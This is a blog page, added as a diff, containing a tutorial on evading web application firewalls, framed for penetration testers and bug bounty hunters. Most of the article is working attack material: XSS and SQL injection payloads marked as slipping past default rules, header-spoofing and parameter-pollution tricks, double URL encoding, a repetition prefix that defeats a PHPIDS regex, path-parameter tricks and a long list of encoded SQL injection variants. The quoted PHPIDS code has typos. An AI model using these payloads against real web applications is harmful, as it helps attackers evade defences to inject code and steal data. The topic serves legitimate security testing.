@@ -1,0 +1,1294 @@
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage"><head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <link rel="icon" href="/favicon.ico">
+
+  <title>
+  Non-Discriminatory WAF Torment - Anti-Sec
+  </title>
+  <meta name="description" content="Non-exclusionary and adaptable WAF Bypasses to Try Against Any Adversary." />
+  <meta name="author" content="Jann Moon" />
+  <meta name="generator" content="Hugo 0.113.0"><link
+    rel="stylesheet"
+    href="http://anti-sec.vercel.app/css/styles.min.edefebc99b1ba9ba1ff7af87510845271b88647dd44a79b589135dd1c22cf370.css"
+    integrity="sha256-7e/ryZsbqbof96+HUQhFJxuIZH3USnm1iRNd0cIs83A="
+  />
+  
+  
+
+  <meta property="og:title" content="Non-Discriminatory WAF Torment" />
+<meta property="og:description" content="Non-exclusionary and adaptable WAF Bypasses to Try Against Any Adversary." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://anti-sec.vercel.app/blog/non-discriminatory-waf-torment/" /><meta property="article:section" content="blog" />
+<meta property="article:published_time" content="2022-07-14T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-07-14T00:00:00+00:00" />
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Non-Discriminatory WAF Torment"/>
+<meta name="twitter:description" content="Non-exclusionary and adaptable WAF Bypasses to Try Against Any Adversary."/>
+
+  <meta itemprop="name" content="Non-Discriminatory WAF Torment">
+<meta itemprop="description" content="Non-exclusionary and adaptable WAF Bypasses to Try Against Any Adversary."><meta itemprop="datePublished" content="2022-07-14T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2022-07-14T00:00:00+00:00" />
+<meta itemprop="wordCount" content="1203">
+<meta itemprop="keywords" content="WAF,Bypass,BugBounty," />
+
+  
+</head>
+<body class="dark:bg-gray-800 dark:text-white relative flex flex-col min-h-screen"><header class="container flex justify-between md:justify-between gap-4 flex-wrap p-6 mx-auto relative">
+  <a href="http://anti-sec.vercel.app/" class="capitalize font-extrabold text-2xl">
+    
+    <img src="/LC.png" alt="Anti-Sec" class="h-8 max-w-full" />
+    
+  </a>
+  <button class="mobile-menu-button md:hidden">
+    <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+      <line x1="4" y1="8" x2="20" y2="8" />
+      <line x1="4" y1="16" x2="20" y2="16" />
+    </svg>
+  </button>
+  <ul class="mobile-menu absolute z-10 px-6 pb-6 md:p-0 top-full left-0 w-full md:w-auto md:relative hidden md:flex flex-col md:flex-row items-end md:items-center gap-4 lg:gap-6 bg-white dark:bg-gray-800">
+
+    
+    <li><a href="/blog">Blog</a></li>
+    
+    <li><a href="/page/about/">About</a></li>
+    
+    <li><a href="/tags">Tags</a></li>
+    
+    <li><a href="/en/blog/4two6-writeup/">Top Post</a></li>
+    
+
+    
+
+    
+    <li class="grid place-items-center">
+      <span class="open-search inline-block cursor-pointer">
+        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" stroke-width="1.5"
+          stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+          <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+          <circle cx="10" cy="10" r="7" />
+          <line x1="21" y1="21" x2="15" y2="15" />
+        </svg>
+      </span>
+    </li>
+    
+
+    
+    <li class="grid place-items-center">
+      <span class="toggle-dark-mode inline-block cursor-pointer">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke-width="1.5"
+          stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+          <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+          <circle cx="12" cy="12" r="3" />
+          <line x1="12" y1="5" x2="12" y2="5.01" />
+          <line x1="17" y1="7" x2="17" y2="7.01" />
+          <line x1="19" y1="12" x2="19" y2="12.01" />
+          <line x1="17" y1="17" x2="17" y2="17.01" />
+          <line x1="12" y1="19" x2="12" y2="19.01" />
+          <line x1="7" y1="17" x2="7" y2="17.01" />
+          <line x1="5" y1="12" x2="5" y2="12.01" />
+          <line x1="7" y1="7" x2="7" y2="7.01" />
+        </svg>
+      </span>
+    </li>
+    
+  </ul>
+</header>
+<main class="flex-1">
+  
+  
+
+  
+  <div class="relative max-w-5xl mx-auto px-4">
+    <img src="floral3.jpg" class="rounded-lg shadow-sm w-full object-contain" />
+    
+    <div class="absolute top-4 right-8 rounded shadow bg-white text-gray-900 dark:bg-gray-900 dark:text-white px-2 py-0.5">
+      
+  
+    July 14, 2022
+  
+
+
+    </div>
+    
+  </div>
+  
+
+  <article class="prose lg:prose-lg mx-auto my-8 dark:prose-dark px-4">
+
+    <h1 class="text-2xl font-bold mb-2">Non-Discriminatory WAF Torment</h1>
+    
+    <h5 class="text-sm flex items-center flex-wrap">
+      <svg xmlns="http://www.w3.org/2000/svg" class="mr-1" width="16" height="16" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+        <rect x="4" y="5" width="16" height="16" rx="2" />
+        <line x1="16" y1="3" x2="16" y2="7" />
+        <line x1="8" y1="3" x2="8" y2="7" />
+        <line x1="4" y1="11" x2="20" y2="11" />
+        <rect x="8" y="15" width="2" height="2" />
+      </svg>
+      Posted on 
+  
+    July 14, 2022
+  
+
+
+      
+        &nbsp;&bull;&nbsp;
+      
+      <svg xmlns="http://www.w3.org/2000/svg" class="mr-1" width="16" height="16" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+        <circle cx="12" cy="12" r="9" />
+        <polyline points="12 7 12 12 15 15" />
+      </svg>
+      6&nbsp;minutes
+      &nbsp;&bull;
+      <svg xmlns="http://www.w3.org/2000/svg" class="mx-1" width="16" height="16" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+        <path d="M3 19a9 9 0 0 1 9 0a9 9 0 0 1 9 0" />
+        <path d="M3 6a9 9 0 0 1 9 0a9 9 0 0 1 9 0" />
+        <line x1="3" y1="6" x2="3" y2="19" />
+        <line x1="12" y1="6" x2="12" y2="19" />
+        <line x1="21" y1="6" x2="21" y2="19" />
+      </svg>
+      1203&nbsp;words
+      
+        
+      
+    </h5>
+    
+
+    <details id="TableOfContents" class="px-4 mt-4 bg-gray-100 dark:bg-gray-700 rounded toc">
+    <summary class="flex items-center font-bold py-2 px-4 cursor-pointer justify-between select-none text-black dark:text-white">
+      <span>Table of contents</span>
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-down" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+        <polyline points="6 9 12 15 18 9"></polyline>
+     </svg>
+    </summary>
+
+    <ul class="mt-2 pb-4">
+        
+
+        
+        <li>
+        <a href="#bypass-methods"><strong>Bypass methods:</strong></a>
+        
+
+        
+        <ul>
+            <li>
+        <a href="#fingerprinting-wafs">Fingerprinting WAFs</a>
+        
+
+        
+        </li><li>
+        <a href="#header-bypasses">Header Bypasses</a>
+        
+
+        
+        <ul>
+            <li>
+        <a href="#http-method-madness">HTTP Method Madness</a>
+        
+
+        
+        </li><li>
+        <a href="#http-parameter-pollution"><strong>HTTP Parameter Pollution</strong></a>
+        
+
+        
+        </li><li>
+        <a href="#combining-sql-injection-and-parameter-pollution"><strong>Combining SQL Injection and Parameter Pollution</strong></a>
+        
+
+        
+        </li></ul>
+      </li><li>
+        <a href="#encodings">Encodings</a>
+        
+
+        
+        </li></ul>
+      </li><li>
+        <a href="#other-interesting-bypasses">Other Interesting Bypasses</a>
+        
+
+        
+        <ul>
+            <li>
+        <a href="#path-parameter-exploitation">Path Parameter Exploitation</a>
+        
+
+        
+        </li><li>
+        <a href="#payload-ideas-to-hassle-wafs-with">Payload Ideas to Hassle WAFs with</a>
+        </li></ul>
+    </li></ul>
+  </details>
+
+    <p>For penetration testers and attackers, dealing with WAFs can be an often frustrating experience.  However, creativity and perserverence will be your greatest assets in the often-tedious tasks of enumerating the firewall&rsquo;s rules and settings through deductive reasoning.  This is almost always a black-box set of trials, akin to a game of &ldquo;Go Fish&rdquo; in the short-term and the usual Cat-and-Mouse game common to cybersecurity in the long term.  Luckily, many organizations misconfigure their WAFs and many imaginative combinations of bypasses can elude defensive expectations, allowing you to fire that harmless and satisfying &ldquo;Alert(1)&rdquo; box, against any firewall (well, hopefully).</p>
+<p>WAFs are much simpler to configure than a comprehensive antivirus solution covering entire operating systems or networks.  WAFs are deployed on specific endpoints and analyze incoming traffic, filtering suspicious requests to prevent various attacks from firing (SQLI, CSRF, XSS, Deserialiization, etc..).</p>
+<p>Generally, a WAF bypass will be one of these three types.</p>
+<ol>
+<li><strong>Pre-Processor:</strong> the WAF skips the input validation completely</li>
+<li><strong>Impedence Mismatch</strong>: the WAF interprets the input differently than the server</li>
+<li><strong>Rule set bypass</strong>: the payload is too sneaky or futuristic for the WAF</li>
+</ol>
+<p>WAF rulesets can include settings that alter a certain input, sanitizing it and preventing it from being passed to the server in a harmful way.  Noticing certain behaviors may trigger WAFs to automatically block the source IP immediately or block a certain specific User-Agent or other header unique to the user.  Headers and IPs can be changed, and setting up Macros or Intruder settings in Burp to bypass these safeguards is the answer for extended testing.</p>
+<p>Oftentimes, success coincides with patience and analytical thinking, as opposed to throwing fat polyglot payloads will usually waste your time.  Oftentimes, the trick is something subtle and simple, just uncommon or nonexistant in payloads lists.</p>
+<p>Take your time and fuzz the input intelligently (usually manually), so you can figure out a bypass if you suspect a vulnerability nearby.</p>
+<h1 id="bypass-methods"><strong>Bypass methods:</strong></h1>
+<p>If a WAF is enabled, it can be assumed it will likely protect the server against the most common attacks that attacker&rsquo;s and automated tools use to test for vulnerabilities.  Here are some common modifications that can bypass certain WAFs, activated with the default rulesets they come with.</p>
+<p><strong>BLOCKED</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>&#39; or <span style="color:#bd93f9">1</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span><span style="color:#ff79c6">--</span>          
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>alert(<span style="color:#bd93f9">1</span>)           
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>script<span style="color:#ff79c6">&gt;</span>alert(<span style="color:#bd93f9">1</span>)<span style="color:#ff79c6">&lt;</span>/script&gt;   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1</span> or <span style="color:#bd93f9">1</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">eval</span>(name)
+</span></span></code></pre></div><p><strong>Undetected</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>&#39; or <span style="color:#bd93f9">2</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">2</span><span style="color:#ff79c6">--</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span> $00alert(<span style="color:#bd93f9">525</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>script type<span style="color:#ff79c6">=</span>vbscript<span style="color:#ff79c6">&gt;</span>MsgBox(<span style="color:#bd93f9">0</span>)<span style="color:#ff79c6">&lt;</span>/script&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>(<span style="color:#bd93f9">1</span>)or(<span style="color:#bd93f9">1</span>)<span style="color:#ff79c6">=</span>(<span style="color:#bd93f9">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>x<span style="color:#ff79c6">=</span><span style="color:#ff79c6">this</span>.name; X(<span style="color:#bd93f9">0</span><span style="color:#ff79c6">?</span>$<span style="color:#ff79c6">:</span>name<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>)
+</span></span></code></pre></div><h2 id="fingerprinting-wafs">Fingerprinting WAFs</h2>
+<p>Another tool in discovering WAF bypasses involves enumerating the target system and provoking the WAF to reveal itself.  Oftentimes, WAF bypasses can be found online before they are patched. Eventually, you will also learn which WAFs are commonly misconfigured in which ways.</p>
+<p>WAFs generally reveal themselves via:</p>
+<ul>
+<li>Uncommon Response codes</li>
+<li>Security signatures in response headers</li>
+<li>Proudly declaring themselves when blocking your request</li>
+<li>Side-channel attacks invoking certain response times (although you most likely won&rsquo;t need to go this far)</li>
+</ul>
+<p>The easiest, fastest and most accurate method is probably to use wafw00f, a WAF fingerprinting toolkit available in the Kali repos or at Github below.</p>
+<p><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">WafW00f on Github</a>
+</p>
+<p>I don&rsquo;t know how noisy this tool is, though I&rsquo;d guess it throws a lot of requests and matches an expected response to it for enumeration.  Seeing a packet that can be traced to this tool would be a clear signal that someone is attacking the server, as a normal employee would not ever need to use this tool.</p>
+<p>You can also fingerprint easily with Nmap and Burp Suite.</p>
+<h2 id="header-bypasses">Header Bypasses</h2>
+<p>Figuring out that the WAF is tracking a specific header&rsquo;s value can allow you to randomize the header&rsquo;s values in your fuzzing sessions to avoid being blocked.  Also, values such as &ldquo;localhost&rdquo; or &ldquo;0.0.0.0&rdquo; can sometimes bypass WAFs, as it assumes the developer is working at the server&rsquo;s location.</p>
+<p>• X-Originating-IP<br>
+• X-Forwarded-For<br>
+• X-Remote-IP<br>
+• X-Remote-Addr</p>
+<h3 id="http-method-madness">HTTP Method Madness</h3>
+<p>Rulesets are often set only for expected verbs like &ldquo;GET&rdquo;, &ldquo;POST&rdquo; or &ldquo;PUT&rdquo; but a random HTTP verb can elude it.</p>
+<h3 id="http-parameter-pollution"><strong>HTTP Parameter Pollution</strong></h3>
+<p>As mentioned earlier, a WAF can parse an input differntly then the back-end server, allowing attackers to sneak by.  Doubling up a parameter, albeit with different values can lead to a successful bypass.</p>
+<p>Consider the following example:</p>
+<pre tabindex="0"><code>/?productid=1&amp;productid=2
+</code></pre><ul>
+<li><strong>ASP.NET</strong> parses it into &ldquo;<code>productid=1,2&quot;</code></li>
+<li><strong>JSP</strong> parses it into &ldquo;<code>productid=1&quot;</code></li>
+<li><strong>PHP</strong> parses it into <code>&quot;productid=2&quot;</code></li>
+</ul>
+<h3 id="combining-sql-injection-and-parameter-pollution"><strong>Combining SQL Injection and Parameter Pollution</strong></h3>
+<p>A legitimate SQL query like below&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>?productid=select 1,2,3 from table
+</span></span></code></pre></div><p>Polluting can lead to a variety of conclusions based on the language of the web app and the rulesets by the WAF.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>?productid=select 1&amp;productid=2,3 from table
+</span></span></code></pre></div><p>This is where manual testing is crucial, as payload lists could never account for all the combinations of servers, parameters, WAFs and their associated rules customized to each organization.</p>
+<h2 id="encodings">Encodings</h2>
+<p>Various encodings (and especially, combinations of them) are commonly used to bypass weak WAF rules.
+Commonly used encodings include hex, URL and double URL.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f1fa8c">`1 union select 1,2,3  
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> ’s’ -&gt; %73 -&gt; %25%37%33   
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">1 union %25%37%33elect 1,2,3`</span>
+</span></span></code></pre></div><p>The <code>s</code> via URL encoding becomes <code>%73</code>, which can be encoded again to create <code>%25%37%33</code>.</p>
+<h1 id="other-interesting-bypasses">Other Interesting Bypasses</h1>
+<p>Certain rules can be set up in strange ways that are unpredictable.</p>
+<p>The following is from PHPIDS open-source WAF and is executed on all inputs received from users.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">public</span> <span style="color:#ff79c6">static</span> <span style="color:#ff79c6">function</span> <span style="color:#50fa7b">convertFromRepetition</span>(<span style="color:#8be9fd;font-style:italic">$value</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">// remove obvious repetition patterns
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">$value</span> <span style="color:#ff79c6">=</span> preg_replace{(
+</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;/(?:(.{2,})\1{32,})|(?:[+=|\-@\s]{128,})/&#39;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;x&#39;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$value</span>
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">return</span> $ value;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The above excerpt comes from the IDS_Converter class found in the <code>Converter.php</code> file and contains the vulnerable regex shown above.</p>
+<p>Commonly troubling characters are replaced, but only for the first 33 times they are matched.  Therefore, attacks like XSS payloads, SQL injections and LFI attacks would all bypass the WAF - as long as you copy and paste them more than 33 times in your input. To make it easier, you can just copy this before any payload for successful exploitation.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>
+</span></span><span style="display:flex;"><span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s<span style="color:#ff79c6">%</span>s <span style="color:#ff79c6">&lt;</span>PAYLOAD HERE<span style="color:#ff79c6">&gt;</span>
+</span></span></code></pre></div><h2 id="path-parameter-exploitation">Path Parameter Exploitation</h2>
+<p>Many WAFs also do not anticipate attacks that modify the URL path in unexpected ways. The following attacks have worked against Apache on some servers.</p>
+<p>Adding a slash at the end of a URL, some junk characters and parameters followed by a payload.</p>
+<pre tabindex="0"><code>example.com/giant/pig.php/haku?userid=1PAYLOAD
+</code></pre><p>Using a semicolon and more unexpected parameter madness.</p>
+<pre tabindex="0"><code>example.com/giant/pig.php;param=value?userid=1PAYLOAD
+</code></pre><p>Even this, a lone semicolon is enough.</p>
+<pre tabindex="0"><code>example.com/giant;/pig.php?userid=1PAYLOAD
+</code></pre><h2 id="payload-ideas-to-hassle-wafs-with">Payload Ideas to Hassle WAFs with</h2>
+<p>Below are some common and quick examples of ways to tamper with payloads to try to enumerate a WAFs ruleset.  Note: BLasting all of these into a parameter will be very unlikely to do anything but inconvenience you by being quickly banned.</p>
+<pre tabindex="0"><code>`1 or 1=1   
+1&#39; or &#39;&#39;=&#39;   
+1&#34; or &#34;&#34;=&#34;   
+1&#39; or true#   
+1&#34; or true#   
+1 or true# etc.`   
+  
+`or &#39;1   
+|| &#39;1   
+null&#39; || &#39;a&#39;=_binary&#39;a   
+1&#39; || &#39;a&#39;=x&#39;61   
+1&#39; &amp;&amp; &#39;0&#39;=x&#39;30   
+1&#39; %26%26 %270%27%3dx&#39;30   
+2&#39; &amp;&amp; 0.e1=_binary&#34;0   
+1 or 1.e1=0b1010   
+&#39; || 1 like 1   
+&#39;-&#39;   
+&#34;-&#34;   
+&#39; || 2 not like 1   
+110 or x&#39;30&#39;=48   
+&#39;1&#39;!=20   
+1 or 20!=&#39;1&#39;   
+2 and 2&gt;0   
+3 || 0&lt;1   
+12 || 0b1010&lt;0b1011   
+0b11 || 0b1010x&#39;30&#39;   
+1 or 0b1   
+2121/**/||21   
+111&#39; or _binary&#39;1   
+1 or 2121   
+1&#39; or 12 rlike &#39;1`
+
+`%55nion(%53elect)   
+union%20distinct%20select   
+union%20%64istinctRO%57%20select   
+union%2053elect   
+%23?%0auion%20?%23?%0aselect   
+%23?zen?%0Aunion all%23zen%0A%23Zen%0Aselect   
+%55nion %53eLEct   
+u%6eion se%6cect   
+unio%6e %73elect   
+unio%6e%20%64istinc%74%20%73elect   
+uni%6fn distinct%52OW s%65lect   
+%75%6e%6f%69%6e %61%6c%6c %73%65%6c%65%63%74`
+
+@ **Normal Hex**  
+`select 0x313131`   
+**Hexed Bypass Version**   
+`select x&#39;313131&#39;;`   
+**Binary Bypass**   
+`select 0b011110100110010101101110;`   
+**Bypass using functions**   
+`select unhex(x&#39;333133313331&#39;);`
+</code></pre>
+  </article>
+<div class="px-2 mb-2">
+  
+  <script src="https://giscus.app/client.js"
+    data-repo=""
+    data-repo-id=""
+    data-category=""
+    data-category-id=""
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="preferred_color_scheme"
+    data-lang="en"
+    crossorigin="anonymous"
+    async>
+  </script>
+  
+</div>
+<div class="bg-blue-100 dark:bg-gray-900">
+  <div class="container px-4 py-12 mx-auto max-w-4xl grid grid-cols-1 md:grid-cols-2 gap-4 items-center">
+    <div>
+      <div class="text-2xl font-bold mb-2">Follow me</div>
+      <p class="opacity-60">Thanks for reading!</p>
+    </div>
+
+    <ul class="flex justify-center gap-x-3 flex-wrap gap-y-2">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+      <li>
+        <a
+          href="https://linkedin.com/in/jann-moon"
+          target="_blank"
+          rel="noopener"
+          aria-label="LinkedIn"
+          class="p-1 inline-block rounded-full border border-transparent text-gray-500 hover:text-gray-800 hover:border-gray-800 cursor-pointer transition-colors dark:text-gray-600 dark:hover:border-gray-300 dark:hover:text-gray-300"
+        >
+          <svg
+            xmlns="http://www.w3.org/2000/svg"
+            width="24"
+            height="24"
+            viewBox="0 0 24 24"
+            stroke-width="1.5"
+            stroke="currentColor"
+            fill="none"
+            stroke-linecap="round"
+            stroke-linejoin="round"
+          >
+            <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+            <rect x="4" y="4" width="16" height="16" rx="2" />
+            <line x1="8" y1="11" x2="8" y2="16" />
+            <line x1="8" y1="8" x2="8" y2="8.01" />
+            <line x1="12" y1="16" x2="12" y2="11" />
+            <path d="M16 16v-3a2 2 0 0 0 -4 0" />
+          </svg>
+        </a>
+      </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+      <li>
+        <a
+          href="https://github.com/scumdestroy"
+          target="_blank"
+          rel="noopener"
+          aria-label="GitHub"
+          class="p-1 inline-block rounded-full border border-transparent text-gray-500 hover:text-gray-800 hover:border-gray-800 cursor-pointer transition-colors dark:text-gray-600 dark:hover:border-gray-300 dark:hover:text-gray-300"
+        >
+          <svg
+            xmlns="http://www.w3.org/2000/svg"
+            width="24"
+            height="24"
+            viewBox="0 0 24 24"
+            stroke-width="1.5"
+            stroke="currentColor"
+            fill="none"
+            stroke-linecap="round"
+            stroke-linejoin="round"
+          >
+            <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+            <path
+              d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"
+            />
+          </svg>
+        </a>
+      </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+      <li>
+        <a
+          href="https://medium.com/@scumdestroy"
+          target="_blank"
+          rel="noopener"
+          aria-label="Medium"
+          class="p-1 inline-block rounded-full border border-transparent text-gray-500 hover:text-gray-800 hover:border-gray-800 cursor-pointer transition-colors dark:text-gray-600 dark:hover:border-gray-300 dark:hover:text-gray-300"
+        >
+          <svg
+            xmlns="http://www.w3.org/2000/svg"
+            width="24"
+            height="24"
+            viewBox="0 0 24 24"
+            stroke-width="1.5"
+            stroke="currentColor"
+            fill="none"
+            stroke-linecap="round"
+            stroke-linejoin="round"
+          >
+            <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+            <rect x="4" y="4" width="16" height="16" rx="2" />
+            <path d="M8 9h1l3 3l3 -3h1" />
+            <line x1="8" y1="15" x2="10" y2="15" />
+            <line x1="14" y1="15" x2="16" y2="15" />
+            <line x1="9" y1="9" x2="9" y2="15" />
+            <line x1="15" y1="9" x2="15" y2="15" />
+          </svg>
+        </a>
+      </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
